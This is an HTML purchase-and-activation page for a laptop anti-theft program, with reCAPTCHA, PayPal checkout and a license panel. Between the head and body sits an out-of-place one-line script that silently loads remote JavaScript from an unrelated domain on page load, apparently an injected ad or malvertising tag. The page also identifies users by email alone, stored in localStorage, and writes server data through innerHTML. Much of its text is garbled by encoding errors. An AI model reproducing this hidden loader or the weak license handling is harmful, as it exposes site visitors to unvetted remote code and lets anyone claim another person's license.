<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Antiâ€‘Theftâ€¯Guardianâ€¯v2.0â€¯â€”â€¯Secureâ€¯Yourâ€¯Device</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="description" content="Buy or activate Antiâ€‘Theftâ€¯Guardianâ€¯v2.0 license easily and securely.">
<link rel="icon" href="icon.png">
<style>
  body{font-family:'Segoe UI',Arial,sans-serif;margin:0;background:#f8fbff;color:#111}
  .container{max-width:450px;margin:3rem auto;background:#fff;border-radius:10px;
             box-shadow:0 6px 25px #0001;padding:2rem}
  h1,h2{text-align:center;margin:0 0 1.5rem}
  .btn{display:inline-block;background:#0078d7;color:#fff;border:0;border-radius:4px;
       padding:.8rem 2.2rem;font-weight:600;cursor:pointer;box-shadow:0 2px 8px #0078d733}
  .btn:hover{background:#005ea5}
  .hidden{display:none!important}
  .field{margin-bottom:1.3rem}
  label{display:block;margin-bottom:.4rem;font-weight:500}
  input[type=email],input[type=text]{width:100%;padding:.7em;border:1px solid #ccc;border-radius:5px}
  .err{color:#d00;margin-top:.6em}
  .msg{color:#090}
  #paypal-button-container{margin-top:1.6rem}
  #logout{float:right;background:#eee;color:#333;margin-top:-1.4rem}
  footer{text-align:center;margin:2rem 0 0;font-size:.9rem;color:#888}
  .feature-list{list-style:none;padding-left:0}
  .feature-list li:before{content:'âœ“ ';color:#0078d7}
</style>

<!-- âœ… Google reCAPTCHA v2 Invisible  -->
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
<!-- âœ… PayPal Smart Buttons -->
<script src="https://www.paypal.com/sdk/js?client-id=YOUR_PAYPAL_CLIENT_ID"></script>
</head>
<script>(function(s){s.dataset.zone='10183524',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
<body>
<div class="container">
  <!-- LANDING -->
  <section id="landing">
    <h1>Antiâ€‘Theftâ€¯Guardianâ€¯v2.0</h1>
    <h2>Defend your laptopâ€¯fromâ€¯physicalâ€¯theft</h2>
    <ul class="feature-list">
      <li>Instant unplug alarm</li>
      <li>Shutdown prevention</li>
      <li>Oneâ€‘device lifetime license</li>
      <li>Windowsâ€¯10/11â€¯Compatible</li>
    </ul>
    <button class="btn" onclick="goLogin()">Getâ€¯Started</button>
  </section>

  <!-- LOGIN / SIGNâ€‘UP -->
  <section id="login" class="hidden">
    <h2>Yourâ€¯Emailâ€¯forâ€¯Activation</h2>
    <form id="login-form" onsubmit="return false;">
      <div class="field">
        <label>Emailâ€¯address</label>
        <input type="email" id="email" required placeholder="you@example.com">
        <div class="err" id="errMsg"></div>
      </div>
      <button class="g-recaptcha btn"
              data-sitekey="YOUR_RECAPTCHA_SITE_KEY"
              data-callback="submitHuman"
              data-action="submit">Continue</button>
    </form>
  </section>

  <!-- USER PANEL -->
  <section id="panel" class="hidden">
    <button id="logout" onclick="doLogout()">â‹â€¯Logout</button>
    <h2>Welcome,â€¯<span id="user-email"></span></h2>
    <div id="status"></div>
  </section>
</div>

<footer>Â©â€¯2025â€¯Parhamâ€¯Panahâ€¯Â·â€¯<a href="https://parhampanah.com">Mainâ€¯Site</a>
  <style>
  .trust-badges{text-align:center;margin-top:2rem}
  .trust-badges img{height:40px;margin:0 .6rem;vertical-align:middle}
  .trust-links{font-size:.85rem;color:#777;margin-top:.6rem}
  .trust-links a{color:#0078d7;text-decoration:none}
  .trust-links a:hover{text-decoration:underline}
  </style>
  
  <div class="trust-badges">
    <span style="font-size:1.8rem">ğŸ›¡ï¸</span>â€¯Secureâ€¯CheckoutÂ Â â€¢
    <span style="font-size:1.8rem">ğŸ’³</span>â€¯PayPalâ€¯VerifiedÂ Â â€¢
    <span style="font-size:1.8rem">ğŸ”’</span>â€¯SSLâ€¯Protected
    <div class="trust-links">
      <a href="policy.html">Privacyâ€¯Policy</a>Â â€¢Â 
      <a href="support.html">Contactâ€¯Support</a>Â â€¢Â 
      <a href="https://parhampanah.com">Officialâ€¯Website</a>
    </div>
  </div>
</footer>

<script>
const backend="https://watchdog.parhampanah.com"; // FastAPI domain
const q=s=>document.querySelector(s);

// ===== View control =====
function view(v){["#landing","#login","#panel"].forEach(id=>q(id).classList.add("hidden"));
q(v).classList.remove("hidden");}
function goLogin(){view("#login");}
function goPanel(){view("#panel");loadPanel();}

// ===== User state =====
function getUser(){return localStorage.getItem('atg_email');}
function setUser(e){localStorage.setItem('atg_email',e);}
function clearUser(){localStorage.removeItem('atg_email');location.reload();}

window.onload=()=>{getUser()?goPanel():view("#landing");};

// ===== reCAPTCHA callback =====
function submitHuman(token){
 const email=q("#email").value.trim().toLowerCase();
 if(!email){q("#errMsg").textContent="Pleaseâ€¯enterâ€¯email.";return;}
 fetch(`${backend}/check-captcha`,{
   method:"POST",headers:{"Content-Type":"application/json"},
   body:JSON.stringify({token,email})
 }).then(r=>r.json()).then(resp=>{
   if(!resp.human){q("#errMsg").textContent="Robotâ€¯checkâ€¯failed.";grecaptcha.reset();}
   else {
     // call signup/login on backend
     fetch(`${backend}/login`,{
       method:"POST",headers:{"Content-Type":"application/json"},
       body:JSON.stringify({email})
     }).then(r=>r.json()).then(d=>{
        if(d.status==="not_found"){  // autoâ€‘signâ€‘up
          fetch(`${backend}/signup`,{
            method:"POST",headers:{"Content-Type":"application/json"},
            body:JSON.stringify({email})
          });
        }
        setUser(email);goPanel();
     });
   }
 });
}

// ===== Logout =====
function doLogout(){clearUser();}

// ===== Panel loading =====
function loadPanel(){
 const email=getUser(); q("#user-email").textContent=email;
 const s=q("#status"); s.innerHTML="Loadingâ€¯licenseâ€¯statusâ€¯â€¦";
 fetch(`${backend}/verify/${encodeURIComponent(email)}`)
 .then(r=>r.json()).then(d=>{
    if(d.status==="licensed"&&d.code){
       s.innerHTML=`<div class='msg'>âœ…â€¯Licensed</div>
       <p>Yourâ€¯Activationâ€¯Code:</p>
       <input style="width:80%" readonly value="${d.code}">
       <button onclick="navigator.clipboard.writeText('${d.code}')">Copy</button>`;
    } else {
       s.innerHTML=`<div class='err'>Noâ€¯licenseâ€¯detected.</div>
       <div id='paypal-button-container'></div>
       <p style="font-size:.9em;color:#777">orâ€¯enterâ€¯existingâ€¯code:</p>
       <input id="manual-code" placeholder="Pasteâ€¯activationâ€¯code">
       <button onclick="enterCode()">Activate</button>`;
       renderPayPal(email);
    }
 })
 .catch(()=>s.innerHTML="<div class='err'>Serverâ€¯notâ€¯reachable.</div>");
}

// ===== PayPal Buttons =====
function renderPayPal(email){
 paypal.Buttons({
   style:{shape:"pill",color:"blue",label:"paypal"},
   createOrder:(data,actions)=>actions.order.create({
     purchase_units:[{
       description:"Antiâ€‘Theftâ€¯Guardianâ€¯v2.0â€¯License",
       amount:{currency_code:"USD",value:"14.99"}
     }]
   }),
   onApprove:(data,actions)=>actions.order.capture().then(det=>{
     fetch(`${backend}/payment-success`,{
       method:"POST",headers:{"Content-Type":"application/json"},
       body:JSON.stringify({
         email,order_id:data.orderID,
         payer_email:det.payer.email_address,
         payer_name:det.payer.name.given_name
       })
     }).then(r=>r.json()).then(()=>{
        alert("âœ…â€¯Payment successful!â€¯Checkâ€¯yourâ€¯emailâ€¯forâ€¯theâ€¯activationâ€¯code.");
        loadPanel();
     }).catch(()=>alert("Payment OKâ€¯butâ€¯serverâ€¯error.â€¯Pleaseâ€¯forwardâ€¯receiptâ€¯toâ€¯support."));
   }),
   onError:()=>alert("Paymentâ€¯failed,â€¯pleaseâ€¯retry.")
 }).render("#paypal-button-container");
}

// ===== Manual code entry =====
function enterCode(){
 const email=getUser(),code=q("#manual-code").value.trim();
 if(!code){alert("Enterâ€¯yourâ€¯code.");return;}
 fetch(`${backend}/verify-code`,{
   method:"POST",headers:{"Content-Type":"application/json"},
   body:JSON.stringify({email,code})
 }).then(r=>r.json()).then(d=>{
   if(d.ok){alert("âœ…â€¯Activated!");loadPanel();}
   else alert("Invalidâ€¯code.");
 });
}
</script>
</body>
</html>
